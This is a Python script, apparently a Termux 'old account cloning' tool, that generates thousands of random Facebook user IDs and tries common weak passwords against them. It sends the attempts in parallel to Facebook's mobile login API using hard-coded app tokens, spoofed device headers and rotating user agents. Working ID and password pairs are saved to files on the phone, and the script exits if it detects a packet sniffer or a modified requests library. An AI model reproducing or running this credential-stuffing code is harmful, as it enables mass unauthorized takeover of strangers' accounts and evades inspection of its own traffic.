#!/usr/bin/env python3
"""
English version of the script without key approval.
This script performs initial setup, shows a locked message,
opens the author link, performs some anti-tampering checks,
and then proceeds to display a menu with several cloning options.
"""

import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# Author's link and information
author_link = "https://www.facebook.com/profile.php?id=61581977649127"
author_name = "gab hndsm"

def first_step():
    os.system("clear")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("        🔒 Script Locked 🔒")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    print("\033[1;32m Follow the author for updates. \033[0m")
    print(f"\033[1;32m {author_name}: {author_link} \033[0m\n")
    print("[!] Please follow the author before proceeding.")
    input("\n[↩] Press Enter once you have followed the author...")

# Show author link by opening it automatically
first_step()
os.system(f'xdg-open {author_link}')
os.system(f'{author_link}')

# --- Ensure required modules are installed ---
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# Initial setup and promotional actions
os.system('clear')
print(' \x1b[38;5;46mSERVER LOADING....')

os.system('pip uninstall requests chardet urllib3 idna certifi -y; pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx; pip install beautifulsoup4')
print('Loading modules ...\n')
os.system('clear')

# --- Anti-tampering and Security Checks ---
# Check if the source code of the 'requests' library has been modified
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            sys.exit()
except:
    pass

class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            try:
                if 'print' in open(path, 'r').read():
                    self.terminate()
            except:
                pass
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.terminate()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.terminate()

    def terminate(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations! Security check failed.')
        self.print_separator()
        sys.exit()

    def print_separator(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Terminal color codes
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'

def windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(5, 7))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(8, 12))}.0.{random.choice(range(552, 661))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(5, 7))}.{random.choice(['2', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(12, 42))}.0.{random.choice(range(742, 2200))}.{random.choice(range(1, 120))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['2', '1'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(12, 42))}.0.{random.choice(range(742, 2200))}.{random.choice(range(1, 120))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{random.choice(range(1, 7120))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    """
    Generates an alternate random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

# Set window title
sys.stdout.write('\x1b]2;【GAB TOOL】\x07')

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    print("""\033[1;32m
        
                  (\  (\ 
 ("• - •")  KUPAL  . . . 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
Follow the author for more updates!
Author    : gab hndsm
Link      : https://www.facebook.com/profile.php?id=61581977649127
┊ Name    : GAB HANDSM
┊ Age     : Secret
┊ Gender  : Lalaki
┊ Course  : BS information technology
      
============================
                TOOL BY gab hndsm
\033[0m""")

def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def clear():
    os.system('clear')

def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def BNG_71_():
    """
    Main menu function.
    """
    ____banner____()
    print('       \x1b[38;5;196m(A)\x1b[1;37m OLD ACCOUNT TOOL')
    linex()
    choice = input(f"       Choice {W}: {Y}")
    if choice in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose a valid option... ")
        time.sleep(2)
        BNG_71_()

def old_clone():
    """
    Menu for selecting old account cloning type.
    """
    ____banner____()
    print('       \x1b[38;5;196m(A)\x1b[1;37m ALL SERIES')
    linex()
    print('       \x1b[38;5;196m(B)\x1b[1;37m 100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(C)\x1b[1;37m 2009 SERIES')
    linex()
    _input = input(f"       Choice {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad}Choose a valid option... ")
        BNG_71_()

def old_One():
    """
    Cloning method for accounts from 2010-2014.
    """
    user = []
    ____banner____()
    print(f"       Old Code: 2010-2014")
    ask = input("       SELECT: ")
    linex()
    ____banner____()
    print("       EXAMPLE: 20000 / 30000 / 99999")
    limit = input("       SELECT number of IDs: ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('       (A) METHOD 1')
    print('       (B) METHOD 2')
    linex()
    meth = input("       CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       TOTAL IDs from crack: {limit}")
        print("       USE AIRPLANE MODE for better results")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tow():
    """
    Cloning method for accounts with specific prefixes.
    """
    user = []
    ____banner____()
    print(f"       OLD CODE: 2010-2014")
    ask = input("       SELECT: ")
    linex()
    ____banner____()
    print("       EXAMPLE: 20000 / 30000 / 99999")
    limit = input("       SELECT number of IDs: ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       (A) METHOD A')
    print('       (B) METHOD B')
    linex()
    meth = input("       CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       TOTAL IDs from crack: {limit}")
        print("       USE AIRPLANE MODE for better results")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tree():
    """
    Cloning method for accounts from 2009-2010.
    """
    user = []
    ____banner____()
    print("       OLD CODE: 2009-2010")
    ask = input("       SELECT: ")
    linex()
    ____banner____()
    print("       EXAMPLE: 20000 / 30000 / 99999")
    limit = input("       TOTAL ID COUNT: ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       (A) METHOD A')
    print('       (B) METHOD B')
    linex()
    meth = input("       CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       TOTAL IDs from crack: {limit}")
        print("       MAKE SURE TO ENABLE AIRPLANE MODE")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def login_1(uid):
    """
    Login attempt method 1.
    """
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r {W}+({X} GAB HNDSM OK ID-M1 {W}) ({rad}{loop}{W}) ({X}OK{W}) ({rad}{len(oks)}{W})")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\n {W}=> {G}{uid} {W}=> {G}{pw} {W}=> {G}{creationyear(uid)}")
                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\n {W}=> {G}{uid} {W}=> {G}{pw} {W}=> {G}{creationyear(uid)}")
                open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
    except Exception as e:
        pass
    loop += 1

def login_2(uid):
    """
    Alternate login attempt method.
    """
    # This function is implemented similarly to login_1 for demonstration.
    login_1(uid)

if __name__ == '__main__':
    BNG_71_()